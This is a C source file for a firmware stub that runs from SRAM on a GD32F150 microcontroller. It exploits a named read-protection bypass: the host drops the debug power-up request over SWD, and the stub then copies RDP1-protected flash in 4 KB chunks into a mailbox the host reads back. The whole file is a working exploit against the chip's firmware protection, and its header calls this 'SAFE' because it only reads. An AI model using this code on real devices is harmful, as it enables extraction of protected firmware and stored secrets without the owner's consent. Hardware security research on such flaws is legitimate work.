/*
 * Memory-mailbox SRAM flash dumper for GD32F150C8T6 (under RDP1).
 *
 * Runs from SRAM (0x20000000). Exploits GigaVulnerability #2 (PT SWARM):
 *   1. Host loads this stub into SRAM (0x20000000) via SWD.
 *   2. Host sets up mailbox at 0x20000400 (addr, len=4096, cmd=1) and
 *      immediately clears CDBGPWRUPREQ (writedp 0x4 0x0) so the GD32 FMC
 *      no longer sees an active debugger and permits SRAM code to read
 *      RDP1-protected main flash (0x08000000..0x0800FFFF).
 *   3. Stub waits ~80 ms for CDBGPWRUPREQ to drop, copies the 4 KB flash
 *      chunk into the SRAM mailbox buffer (0x20000418), computes CRC-16/CCITT,
 *      and marks status = 1 (READY).
 *   4. Host re-attaches SWD (without resetting SRAM) and reads the 4 KB buffer
 *      and CRC-16 directly over SWD (TP16/TP17).
 *
 * Zero UART wires needed!
 * SAFE: Only READS flash memory. Does NOT erase, write, or unlock anything.
 */

#include <stdint.h>

#define RCU_BASE         0x40021000U
#define RCU_AHBEN        (*(volatile uint32_t *)(RCU_BASE + 0x14U))
#define RCU_APB1EN       (*(volatile uint32_t *)(RCU_BASE + 0x1CU))

#define GPIOB_BASE       0x48000400U
#define GPIOC_BASE       0x48000800U
#define GPIOF_BASE       0x48001400U
#define GPIO_CTL(b)      (*(volatile uint32_t *)((b) + 0x00U))
#define GPIO_BOP(b)      (*(volatile uint32_t *)((b) + 0x18U))

#define FWDGT_BASE       0x40003000U
#define FWDGT_CTL        (*(volatile uint32_t *)(FWDGT_BASE + 0x00U))
#define FWDGT_PSC        (*(volatile uint32_t *)(FWDGT_BASE + 0x04U))
#define FWDGT_RLD        (*(volatile uint32_t *)(FWDGT_BASE + 0x08U))
#define FWDGT_KEY_RELOAD 0xAAAAU
#define FWDGT_KEY_ACCESS 0x5555U

#define MAILBOX_ADDR     0x20000400U
#define DUMP_MAGIC       0x44554D50U /* "DUMP" */
#define DUMP_CHUNK_SIZE  4096U

typedef struct {
    volatile uint32_t magic;                /* +0x00: 0x44554D50 ("DUMP") */
    volatile uint32_t cmd;                  /* +0x04: 0: idle, 1: dump_chunk, 2: done */
    volatile uint32_t status;               /* +0x08: 0: busy, 1: ok/ready, 2: error */
    volatile uint32_t addr;                 /* +0x0C: source flash address */
    volatile uint32_t len;                  /* +0x10: chunk length in bytes (<= 4096) */
    volatile uint16_t crc;                  /* +0x14: CRC-16/CCITT of chunk */
    volatile uint16_t seq;                  /* +0x16: completed chunk counter */
    volatile uint8_t  buf[DUMP_CHUNK_SIZE]; /* +0x18: 4 KB chunk buffer */
} dump_mailbox_t;

#define mb (*(volatile dump_mailbox_t *)MAILBOX_ADDR)

static void delay(uint32_t n)
{
    FWDGT_CTL = FWDGT_KEY_RELOAD;
    while (n--) {
        __asm__ volatile("nop");
    }
    FWDGT_CTL = FWDGT_KEY_RELOAD;
}

void main(void)
{
    /* 1. Disable interrupts and SysTick so nothing vectors back into Flash */
    __asm__ volatile("cpsid i");
    *(volatile uint32_t *)0xE000E010U = 0U;          /* SysTick CTL */
    *(volatile uint32_t *)0xE000E180U = 0xFFFFFFFFU; /* NVIC ICER */
    *(volatile uint32_t *)0xE000E280U = 0xFFFFFFFFU; /* NVIC ICPR */

    /* 2. Extend Watchdog to maximum ~26 seconds and freeze during debug */
    FWDGT_CTL = FWDGT_KEY_ACCESS;
    FWDGT_PSC = 7U;
    FWDGT_RLD = 0x0FFFU;
    FWDGT_CTL = FWDGT_KEY_RELOAD;
    *(volatile uint32_t *)0x40015804U |= (1U << 8);

    /* 3. Enable GPIO clocks: GPIOA (17), GPIOB (18), GPIOC (19), GPIOF (22) */
    RCU_AHBEN  |= (1U << 17) | (1U << 18) | (1U << 19) | (1U << 22);
    RCU_APB1EN |= (1U << 17);
    delay(1000U);

    /* 4. Hold power latches: PC15, PB3, and PF7 */
    {
        uint32_t ctl = GPIO_CTL(GPIOC_BASE);
        ctl &= ~(3U << (15 * 2));
        ctl |=  (1U << (15 * 2));
        GPIO_CTL(GPIOC_BASE) = ctl;
        GPIO_BOP(GPIOC_BASE) = (1U << 15);

        ctl = GPIO_CTL(GPIOB_BASE);
        ctl &= ~(3U << (3 * 2));
        ctl |=  (1U << (3 * 2));
        GPIO_CTL(GPIOB_BASE) = ctl;
        GPIO_BOP(GPIOB_BASE) = (1U << 3);

        ctl = GPIO_CTL(GPIOF_BASE);
        ctl &= ~(3U << (7 * 2));
        ctl |=  (1U << (7 * 2));
        GPIO_CTL(GPIOF_BASE) = ctl;
        GPIO_BOP(GPIOF_BASE) = (1U << 7);
    }

    /* 5. Preserve pre-populated command if host wrote mailbox before resume */
    if (mb.magic != DUMP_MAGIC) {
        mb.magic = DUMP_MAGIC;
        mb.cmd = 0U;
        mb.status = 1U; /* READY */
        mb.crc = 0U;
        mb.seq = 0U;
    }

    while (1) {
        FWDGT_CTL = FWDGT_KEY_RELOAD;
        if (mb.cmd == 1U) { /* DUMP_CHUNK */
            mb.status = 0U; /* BUSY */

            /*
             * Wait ~15 ms at 8 MHz HSI for host's debug power-down
             * (clearing CDBGPWRUPREQ) to take effect before reading Flash.
             */
            delay(15000U);

            uint32_t addr = mb.addr;
            uint32_t len = mb.len;
            if (len > DUMP_CHUNK_SIZE) {
                len = DUMP_CHUNK_SIZE;
            }

            const volatile uint8_t *src = (const volatile uint8_t *)addr;
            uint16_t crc = 0x0000U;

            for (uint32_t i = 0U; i < len; i++) {
                if ((i & 0xFFU) == 0U) {
                    FWDGT_CTL = FWDGT_KEY_RELOAD;
                }
                uint8_t b = src[i];
                mb.buf[i] = b;
                crc ^= (uint16_t)b << 8;
                for (int k = 0; k < 8; k++) {
                    crc = (crc & 0x8000U) ? (uint16_t)((crc << 1) ^ 0x1021U)
                                          : (uint16_t)(crc << 1);
                }
            }

            mb.crc = crc;
            mb.seq = (uint16_t)(mb.seq + 1U);
            mb.cmd = 0U;
            mb.status = 1U; /* READY / OK */
        } else if (mb.cmd == 2U) { /* DONE */
            mb.cmd = 0U;
            mb.status = 1U;
            break;
        }
    }

    while (1) {
        delay(100000U);
    }
}
